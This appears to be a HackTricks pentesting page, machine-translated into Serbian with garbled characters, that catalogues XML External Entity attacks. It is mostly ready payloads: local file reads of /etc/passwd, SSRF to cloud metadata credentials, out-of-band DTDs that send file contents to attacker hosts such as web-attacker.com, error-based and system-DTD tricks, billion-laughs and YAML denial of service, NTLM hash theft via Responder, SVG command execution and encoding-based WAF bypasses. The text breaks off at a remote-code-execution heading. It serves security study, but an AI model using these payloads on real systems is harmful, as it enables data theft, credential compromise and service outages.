# XXE - XEE - XML Spoljni Entitet

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodi캜u PEASS**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## Osnove XML-a

XML je ozna캜ni jezik dizajniran za skladi코tenje i prenos podataka, sa fleksibilnom strukturom koja omogu캖ava kori코캖enje opisno nazvanih oznaka. Razlikuje se od HTML-a po tome 코to nije ograni캜en na skup unapred definisanih oznaka. Zna캜aj XML-a je opao sa porastom JSON-a, uprkos njegovoj po캜etnoj ulozi u AJAX tehnologiji.

* **Prikaz podataka putem Entiteta**: Entiteti u XML-u omogu캖avaju prikaz podataka, uklju캜uju캖i posebne karaktere poput `&lt;` i `&gt;`, koji odgovaraju `<` i `>` kako bi se izbegli konflikti sa XML-ovim sistemom oznaka.
* **Definisanje XML elemenata**: XML omogu캖ava definisanje tipova elemenata, opisuju캖i kako bi elementi trebalo da budu strukturirani i koji sadr쬬j mogu sadr쬬ti, od bilo kog tipa sadr쬬ja do specifi캜nih podre캠enih elemenata.
* **Definicija Tipa Dokumenta (DTD)**: DTD-ovi su klju캜ni u XML-u za definisanje strukture dokumenta i tipova podataka koje mo쬰 sadr쬬ti. Mogu biti interni, eksterni ili kombinacija, vode캖i na캜inom formatiranja i validacije dokumenata.
* **Prilago캠eni i Spoljni Entiteti**: XML podr쬬va kreiranje prilago캠enih entiteta unutar DTD-a za fleksibilno prikazivanje podataka. Spoljni entiteti, definisani URL-om, izazivaju sigurnosne zabrinutosti, posebno u kontekstu napada spoljnim XML entitetima (XXE), koji iskori코캖avaju na캜in na koji XML parseri obra캠uju spoljne izvore podataka: `<!DOCTYPE foo [ <!ENTITY myentity "vrednost" > ]>`
* **Detekcija XXE sa Parametarskim Entitetima**: Za otkrivanje XXE ranjivosti, posebno kada konvencionalne metode ne uspevaju zbog sigurnosnih mera parsera, mogu se koristiti XML parametarski entiteti. Ovi entiteti omogu캖avaju tehnikama detekcije van opsega, poput pokretanja DNS upita ili HTTP zahteva ka kontrolisanom domenu, da potvrde ranjivost.
* `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///etc/passwd" > ]>`
* `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://napadac.com" > ]>`

## Glavni napadi

[**Ve캖ina ovih napada je testirana koriste캖i sjajne Portswiggers XEE laboratorije: https://portswigger.net/web-security/xxe**](https://portswigger.net/web-security/xxe)

### Test Novog Entiteta

U ovom napadu 캖u testirati da li jednostavna nova deklaracija ENTITETA radi
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY toreplace "3"> ]>
<stockCheck>
<productId>&toreplace;</productId>
<storeId>1</storeId>
</stockCheck>
```
### 캛itanje fajla

Poku코ajmo da pro캜itamo `/etc/passwd` na razli캜ite na캜ine. Za Windows mo쬰te poku코ati da pro캜itate: `C:\windows\system32\drivers\etc\hosts`

U ovom prvom slu캜aju obratite pa쬹ju da 캖e "_\*\*file:///\*\*etc/passwd_" tako캠e raditi.
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<data>&example;</data>
```
Ovaj drugi slu캜aj mo쬰 biti koristan za izvla캜enje fajla ako web server koristi PHP (Nije slu캜aj Portswiggers labova)
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<data>&example;</data>
```
U ovom tre캖em slu캜aju primetite da deklari코emo `Element stockCheck` kao ANY.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ELEMENT stockCheck ANY>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<stockCheck>
<productId>&file;</productId>
<storeId>1</storeId>
</stockCheck3>
```
![](<../.gitbook/assets/image (750).png>)

### Lista direktorijuma

U **Java** baziranim aplikacijama mogu캖e je **izlistati sadr쬬j direktorijuma** putem XXE sa payload-om kao 코to je (samo tra쬰nje direktorijuma umesto fajla):
```xml
<!-- Root / -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE aa[<!ELEMENT bb ANY><!ENTITY xxe SYSTEM "file:///">]><root><foo>&xxe;</foo></root>

<!-- /etc/ -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root[<!ENTITY xxe SYSTEM "file:///etc/" >]><root><foo>&xxe;</foo></root>
```
### SSRF

XXE mo쬰 biti kori코캖en za zloupotrebu SSRF unutar oblaka
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```
### Slepa SSRF

Kori코캖enjem **prethodno komentisane tehnike** mo쬰te naterati server da pristupi serveru koji kontroli코ete kako biste pokazali da je ranjiv. Me캠utim, ako to ne funkcioni코e, mo쬯a je zato 코to **XML entiteti nisu dozvoljeni**, u tom slu캜aju mo쬰te poku코ati koristiti **XML parametarske entitete**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://gtd8nhwxylcik0mt2dgvpeapkgq7ew.burpcollaborator.net"> %xxe; ]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
### "Slepi" SSRF - Izfiltriranje podataka van opsega

**U ovom slu캜aju 캖emo naterati server da u캜ita novi DTD sa zlonamernim payload-om koji 캖e poslati sadr쬬j fajla putem HTTP zahteva (**za **fajlove sa vi코e linija mo쬰te poku코ati da ih izfiltrirate putem** _**ftp://**_ koriste캖i ovaj osnovni server na primer [**xxe-ftp-server.rb**](https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb)**). Ovo obja코njenje se zasniva na** [**Portswiggers lab ovde**](https://portswigger.net/web-security/xxe/blind)**.**

U datom zlonamernom DTD-u, sprovode se niz koraka za izfiltriranje podataka:

### Primer Zlonamernog DTD-a:
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```
Koraci koje izvr코ava ovaj DTD uklju캜uju:

1. **Definicija Parametarskih Entiteta:**
   * XML parametarski entitet, `%file`, je kreiran, 캜itaju캖i sadr쬬j fajla `/etc/hostname`.
   * Drugi XML parametarski entitet, `%eval`, je definisan. Dinami캜ki deklari코e novi XML parametarski entitet, `%exfiltrate`. Entitet `%exfiltrate` je pode코en da napravi HTTP zahtev ka serveru napada캜a, prosle캠uju캖i sadr쬬j entiteta `%file` unutar upita URL-a.
2. **Izvr코avanje Entiteta:**
   * Entitet `%eval` je kori코캖en, 코to dovodi do izvr코avanja dinami캜ke deklaracije entiteta `%exfiltrate`.
   * Zatim se koristi entitet `%exfiltrate`, pokre캖u캖i HTTP zahtev ka odre캠enom URL-u sa sadr쬬jem fajla.

Napada캜 postavlja ovaj zlonamerni DTD na serveru pod svojom kontrolom, obi캜no na URL-u poput `http://web-napadac.com/zlonamerni.dtd`.

**XXE Payload:** Da bi iskoristio ranjivu aplikaciju, napada캜 코alje XXE payload:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
### Zasnovano na gre코kama (Spoljni DTD)

**U ovom slu캜aju 캖emo naterati server da u캜ita zlonamerni DTD koji 캖e prikazati sadr쬬j fajla unutar poruke o gre코ci (ovo je validno samo ako mo쬰te videti poruke o gre코ci).** [**Primer odavde.**](https://portswigger.net/web-security/xxe/blind)

Poruka o gre코ci pri analizi XML-a, otkriva sadr쬬j fajla `/etc/passwd`, mo쬰 biti izazvana kori코캖enjem zlonamernog spoljnog Document Type Definition (DTD). Ovo se posti쬰 kroz slede캖e korake:

1. Defini코e se XML parametarski entitet nazvan `file`, koji sadr쬴 sadr쬬j fajla `/etc/passwd`.
2. Defini코e se XML parametarski entitet nazvan `eval`, koji uklju캜uje dinami캜ku deklaraciju za drugi XML parametarski entitet nazvan `error`. Ovaj entitet `error`, kada se evaluira, poku코ava da u캜ita nepostoje캖i fajl, uklju캜uju캖i sadr쬬j entiteta `file` kao njegovo ime.
3. Poziva se entitet `eval`, 코to dovodi do dinami캜ke deklaracije entiteta `error`.
4. Poziv entiteta `error` rezultira poku코ajem u캜itavanja nepostoje캖eg fajla, proizvode캖i poruku o gre코ci koja uklju캜uje sadr쬬j fajla `/etc/passwd` kao deo imena fajla.

Zlonamerni spoljni DTD mo쬰 biti pozvan kori코캖enjem slede캖eg XML-a:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
### **Zasnovano na gre코kama (sistemski DTD)**

맚a je sa slepim XXE ranjivostima kada su **interakcije van opsega blokirane** (spolja코nje veze nisu dostupne)?.

Rupa u specifikaciji XML jezika mo쬰 **izlo쬴ti osetljive podatke putem gre코aka prilikom me코anja internih i eksternih deklaracija DTD dokumenta**. Ovaj problem omogu캖ava unutra코nje predefinisanje entiteta deklarisanih spolja, olak코avaju캖i izvr코enje napada XXE zasnovanih na gre코kama. Takvi napadi iskori코캖avaju predefinisanje XML parametarskog entiteta, koji je prvobitno deklarisan u spoljnom DTD-u, unutar internog DTD-a. Kada su spoljne veze blokirane od strane servera, napada캜i moraju da se oslone na lokalne DTD datoteke kako bi sproveli napad, sa ciljem izazivanja gre코ke u parsiranju radi otkrivanja osetljivih informacija.

Razmotrite scenarijo u kojem serverski fajl sistem sadr쬴 DTD fajl na lokaciji `/usr/local/app/schema.dtd`, koji defini코e entitet nazvan `custom_entity`. Napada캜 mo쬰 izazvati gre코ku u parsiranju XML-a otkrivaju캖i sadr쬬j fajla `/etc/passwd` podno코enjem hibridnog DTD-a na slede캖i na캜in:
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```
Navedeni koraci se izvr코avaju ovim DTD-om:

* Definicija XML parametarskog entiteta nazvanog `local_dtd` uklju캜uje eksterni DTD fajl sme코ten na serverskom fajl sistemu.
* Dolazi do redefinicije XML parametarskog entiteta `custom_entity`, koji je prvobitno definisan u eksternom DTD-u, kako bi obuhvatio [exploit zasnovan na XXE gre코ci](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-retrieve-data-via-error-messages). Ova redefinicija je osmi코ljena da izazove gre코ku pri parsiranju, otkrivaju캖i sadr쬬j fajla `/etc/passwd`.
* Kori코캖enjem entiteta `local_dtd`, anga쬿je se eksterni DTD, obuhvataju캖i novo definisani `custom_entity`. Ova sekvenca akcija izaziva emitovanje gre코ke koju exploit cilja.

**Primer iz stvarnog sveta:** Sistemi koji koriste GNOME desktop okru쬰nje 캜esto imaju DTD na lokaciji `/usr/share/yelp/dtd/docbookx.dtd` koji sadr쬴 entitet nazvan `ISOamso`.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
![](<../.gitbook/assets/image (622).png>)

Kako ova tehnika koristi **unutra코nji DTD, prvo morate prona캖i validan**. To mo쬰te uraditi **instaliraju캖i** isti **OS / Softver** koji koristi server i **tra쬰캖i neke podrazumevane DTD-ove**, ili **preuzimanjem liste** podrazumevanih DTD-ova unutar sistema i **proverom** da li neki od njih postoji:
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```
Za vi코e informacija pogledajte [https://portswigger.net/web-security/xxe/blind](https://portswigger.net/web-security/xxe/blind)

### Pronala쬰nje DTD-ova unutar sistema

U slede캖em sjajnom github repozitorijumu mo쬰te prona캖i **putanje DTD-ova koji mogu biti prisutni u sistemu**:

{% embed url="https://github.com/GoSecure/dtd-finder/tree/master/list" %}

Osim toga, ako imate **Docker sliku rtvenog sistema**, mo쬰te koristiti alat istog repozitorijuma da **skenirate** **sliku** i **prona캠ete** putanju **DTD-ova** prisutnih unutar sistema. Pro캜itajte [Readme github-a](https://github.com/GoSecure/dtd-finder) da saznate kako.
```bash
java -jar dtd-finder-1.2-SNAPSHOT-all.jar /tmp/dadocker.tar

Scanning TAR file /tmp/dadocker.tar

[=] Found a DTD: /tomcat/lib/jsp-api.jar!/jakarta/servlet/jsp/resources/jspxml.dtd
Testing 0 entities : []

[=] Found a DTD: /tomcat/lib/servlet-api.jar!/jakarta/servlet/resources/XMLSchema.dtd
Testing 0 entities : []
```
### XXE putem analizatora Office Open XML

Za detaljnije obja코njenje ovog napada, **proverite drugi odeljak** [**ove neverovatne objave**](https://labs.detectify.com/2021/09/15/obscure-xxe-attacks/) **iz Detectify-a**.

Mogu캖nost **u캜itavanja Microsoft Office dokumenata nudi se u mnogim web aplikacijama**, koje zatim izvla캜e odre캠ene detalje iz ovih dokumenata. Na primer, web aplikacija mo쬰 dozvoliti korisnicima da uvezu podatke u캜itavanjem tabele u XLSX formatu. Da bi analizator izvukao podatke iz tabele, neizbe쬹o 캖e morati da analizira barem jedan XML fajl.

Da biste testirali ovu ranjivost, potrebno je kreirati **Microsoft Office fajl koji sadr쬴 XXE payload**. Prvi korak je kreiranje praznog direktorijuma u koji se dokument mo쬰 raspakovati.

Kada se dokument raspakuje, XML fajl lociran na `./unzipped/word/document.xml` treba otvoriti i urediti u 쬰ljenom tekst editoru (kao 코to je vim). XML treba izmeniti da uklju캜i 쬰ljeni XXE payload, 캜esto po캜ev코i sa HTTP zahtevom.

Izmenjene linije XML-a treba ubaciti izme캠u dva korena XML objekta. Va쬹o je zameniti URL sa URL-om koji se mo쬰 pratiti zahtevima.

Na kraju, fajl se mo쬰 zapakovati da se kreira zlonamerni poc.docx fajl. Iz prethodno kreiranog direktorijuma "unzipped", treba pokrenuti slede캖u komandu:

Sada se kreirani fajl mo쬰 u캜itati na potencijalno ranjivu web aplikaciju, i mo쬰 se nadati da 캖e zahtev biti prikazan u Burp Collaborator logovima.

### Jar: protokol

**Jar** protokol je dostupan isklju캜ivo unutar **Java aplikacija**. Namenski je dizajniran da omogu캖i pristup fajlovima unutar **PKZIP** arhive (npr. `.zip`, `.jar`, itd.), pru쬬ju캖i podr코ku za lokalne i udaljene fajlove.
```
jar:file:///var/myarchive.zip!/file.txt
jar:https://download.host.com/myarchive.zip!/file.txt
```
{% hint style="danger" %}
Da biste mogli da pristupite datotekama unutar PKZIP datoteka je **izuzetno korisno zloupotrebiti XXE putem sistema DTD datoteka.** Proverite [ovaj odeljak da biste nau캜ili kako da zloupotrebite sistem DTD datoteke](xxe-xee-xml-external-entity.md#error-based-system-dtd).
{% endhint %}

Proces pristupa datoteci unutar PKZIP arhive putem jar protokola uklju캜uje nekoliko koraka:

1. Napravljen je HTTP zahtev za preuzimanje zip arhive sa odre캠ene lokacije, kao 코to je `https://download.website.com/archive.zip`.
2. HTTP odgovor koji sadr쬴 arhivu privremeno se 캜uva na sistemu, obi캜no na lokaciji poput `/tmp/...`.
3. Arhiva se zatim raspakuje kako bi se pristupilo njenom sadr쬬ju.
4. Konkretna datoteka unutar arhive, `file.zip`, se 캜ita.
5. Nakon operacije, sve privremene datoteke kreirane tokom ovog procesa se bri코u.

Interesantna tehnika za prekid ovog procesa u drugom koraku uklju캜uje odr쬬vanje otvorene server konekcije neodre캠eno vreme prilikom serviranja arhivske datoteke. Alati dostupni na [ovom repozitorijumu](https://github.com/GoSecure/xxe-workshop/tree/master/24\_write\_xxe/solution) mogu se koristiti u tu svrhu, uklju캜uju캖i Python server (`slow_http_server.py`) i Java server (`slowserver.jar`).
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:http://attacker.com:8080/evil.zip!/evil.dtd">]>
<foo>&xxe;</foo>
```
{% hint style="danger" %}
Pisanje datoteka u privremeni direktorijum mo쬰 pomo캖i u **pove캖anju druge ranjivosti koja uklju캜uje prolazak kroz putanju** (kao 코to su lokalno uklju캜ivanje datoteka, ubacivanje 코ablona, XSLT RCE, deserijalizacija, itd).
{% endhint %}

### XSS
```xml
<![CDATA[<]]>script<![CDATA[>]]>alert(1)<![CDATA[<]]>/script<![CDATA[>]]>
```
### DoS

#### Napad Milijardu Smeha
```xml
<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```
#### Napad Yaml
```xml
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
```
#### Kvadratni napad na naduvavanje

![](<../.gitbook/assets/image (524).png>)

#### Dobijanje NTML-a

Na Windows hostovima mogu캖e je dobiti NTML he코 korisnika veb servera postavljanjem responder.py handlera:
```bash
Responder.py -I eth0 -v
```
i slanjem slede캖eg zahteva
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM 'file://///attackerIp//randomDir/random.jpg'> ]>
<data>&example;</data>
```
## Skriveni XXE povr코inski

### XInclude

Prilikom integracije klijentskih podataka u serverske XML dokumente, poput onih u pozadinskim SOAP zahtevima, direktna kontrola nad XML strukturom 캜esto je ograni캜ena, ometaju캖i tradicionalne XXE napade zbog ograni캜enja u modifikaciji `DOCTYPE` elementa. Me캠utim, `XInclude` napad pru쬬 re코enje omogu캖avaju캖i umetanje spoljnih entiteta unutar bilo kog podatkovnog elementa XML dokumenta. Ovaj metod je efikasan 캜ak i kada se mo쬰 kontrolisati samo deo podataka unutar serverski generisanog XML dokumenta.

Za izvo캠enje `XInclude` napada, `XInclude` namespace mora biti deklarisan, a putanja datoteke za namenjeni spoljni entitet mora biti navedena. U nastavku je sa쬰t primer kako se takav napad mo쬰 formulisati:
```xml
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```
Proverite [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe) za vi코e informacija!

### SVG - Slanje datoteka

Datoteke koje korisnici otpremaju na odre캠ene aplikacije, a zatim se obra캠uju na serveru, mogu iskoristiti ranjivosti u na캜inu na koji se rukuje XML ili datote캜nim formatima koji sadr쬰 XML. Uobi캜ajeni formati datoteka poput kancelarijskih dokumenata (DOCX) i slika (SVG) zasnovani su na XML-u.

Kada korisnici **po코alju slike**, te slike se obra캠uju ili proveravaju na serveru. 캛ak i za aplikacije koje o캜ekuju formate poput PNG-a ili JPEG-a, **biblioteka za obradu slika na serveru tako캠e mo쬰 podr쬬vati SVG slike**. SVG, kao format zasnovan na XML-u, mo쬰 biti iskori코캖en od strane napada캜a za slanje zlonamernih SVG slika, 캜ime se server izla쬰 ranjivostima na XXE (XML External Entity).

Primer takvog napada je prikazan u nastavku, gde zlonamerna SVG slika poku코ava da pro캜ita sistemsku datoteku:
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200"><image xlink:href="file:///etc/hostname"></image></svg>
```
Druga metoda uklju캜uje poku코aj **izvr코avanja komandi** putem PHP "expect" omota캜a:
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
<image xlink:href="expect://ls"></image>
</svg>
```
U oba slu캜aja, format SVG se koristi za pokretanje napada koji iskori코캖avaju mogu캖nosti obrade XML-a softvera servera, isti캜u캖i potrebu za robustnom validacijom unosa i sigurnosnim merama.

Proverite [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe) za vi코e informacija!

**Napomena da 캖e se prva linija pro캜itanog fajla ili rezultat izvr코enja pojaviti UNUTAR kreiranog slike. Dakle, morate mo캖i da pristupite slici koju je SVG kreirao.**

### **PDF - Slanje fajla**

Pro캜itajte slede캖i post da **biste nau캜ili kako iskoristiti XXE slanjem PDF** fajla:

{% content-ref url="file-upload/pdf-upload-xxe-and-cors-bypass.md" %}
[pdf-upload-xxe-and-cors-bypass.md](file-upload/pdf-upload-xxe-and-cors-bypass.md)
{% endcontent-ref %}

### Content-Type: Od x-www-urlencoded do XML-a

Ako POST zahtev prihvata podatke u XML formatu, mo쬰te poku코ati da iskoristite XXE u tom zahtevu. Na primer, ako normalan zahtev sadr쬴 slede캖e:
```xml
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```
Tada mo쬰te podneti slede캖i zahtev, sa istim rezultatom:
```xml
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```
### Content-Type: Od JSON-a do XEE

Da biste promenili zahtev, mo쬰te koristiti Burp ekstenziju pod nazivom "**Content Type Converter**". [Ovde](https://exploitstube.com/xxe-for-fun-and-profit-converting-json-request-to-xml.html) mo쬰te prona캖i ovaj primer:
```xml
Content-Type: application/json;charset=UTF-8

{"root": {"root": {
"firstName": "Avinash",
"lastName": "",
"country": "United States",
"city": "ddd",
"postalCode": "ddd"
}}}
```

```xml
Content-Type: application/xml;charset=UTF-8

<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE testingxxe [<!ENTITY xxe SYSTEM "http://34.229.92.127:8000/TEST.ext" >]>
<root>
<root>
<firstName>&xxe;</firstName>
<lastName/>
<country>United States</country>
<city>ddd</city>
<postalCode>ddd</postalCode>
</root>
</root>
```
Drugi primer mo쬰 se prona캖i [ovde](https://medium.com/hmif-itb/googlectf-2019-web-bnv-writeup-nicholas-rianto-putra-medium-b8e2d86d78b2).

## Bypass-ovi WAF-a i za코tita

### Base64
```xml
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```
Ovo radi samo ako XML server prihvata `data://` protokol.

### UTF-7

Mo쬰te koristiti \[**"Encode Recipe**" of cyberchef ovde ]\(\[[https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7](https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7) %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4)to]\([https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7 %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to](https://gchq.github.io/CyberChef/#recipe=Encode\_text%28%27UTF-7%20%2865000%29%27%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to)) transformi코ete u UTF-7.
```xml
<!xml version="1.0" encoding="UTF-7"?-->
+ADw-+ACE-DOCTYPE+ACA-foo+ACA-+AFs-+ADw-+ACE-ENTITY+ACA-example+ACA-SYSTEM+ACA-+ACI-/etc/passwd+ACI-+AD4-+ACA-+AF0-+AD4-+AAo-+ADw-stockCheck+AD4-+ADw-productId+AD4-+ACY-example+ADs-+ADw-/productId+AD4-+ADw-storeId+AD4-1+ADw-/storeId+AD4-+ADw-/stockCheck+AD4-
```

```xml
<?xml version="1.0" encoding="UTF-7"?>
+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+
+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
```
### Bypassovanje protokola File:/

Ako web koristi PHP, umesto kori코캖enja `file:/` mo쬰te koristiti **php omota캜e** `php://filter/convert.base64-encode/resource=` da **pristupite internim fajlovima**.

Ako web koristi Javu, mo쬰te proveriti [**jar: protokol**](xxe-xee-xml-external-entity.md#jar-protocol).

### HTML Entiteti

Triks sa [**https://github.com/Ambrotd/XXE-Notes**](https://github.com/Ambrotd/XXE-Notes)\
Mo쬰te kreirati **entitet unutar entiteta** enkodiraju캖i ga sa **html entitetima** i zatim ga pozvati da **u캜ita dtd**.\
Imajte na umu da **HTML Entiteti** koji se koriste moraju biti **numeri캜ki** (kao \[u ovom primeru]\([https://gchq.github.io/CyberChef/#recipe=To\_HTML\_Entity%28true,'Numeric entities'%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B)\\](https://gchq.github.io/CyberChef/#recipe=To\_HTML\_Entity%28true,%27Numeric%20entities%27%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B\)%5C)).
```xml
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % a "&#x3C;&#x21;&#x45;&#x4E;&#x54;&#x49;&#x54;&#x59;&#x25;&#x64;&#x74;&#x64;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4D;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x6F;&#x75;&#x72;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2E;&#x63;&#x6F;&#x6D;&#x2F;&#x62;&#x79;&#x70;&#x61;&#x73;&#x73;&#x2E;&#x64;&#x74;&#x64;&#x22;&#x3E;" >%a;%dtd;]>
<data>
<env>&exfil;</env>
</data>
```
DTD primer:
```xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag">
<!ENTITY % abt "<!ENTITY exfil SYSTEM 'http://172.17.0.1:7878/bypass.xml?%data;'>">
%abt;
%exfil;
```
## PHP Omota캜i

### Base64

**Izvuci** _**index.php**_
```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
```
#### **Izdvajanje spoljnih resursa**
```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3"> ]>
```
### Izvr코enje udaljenog koda

**Ako je u캜itan PHP modul "expect"**
```xml
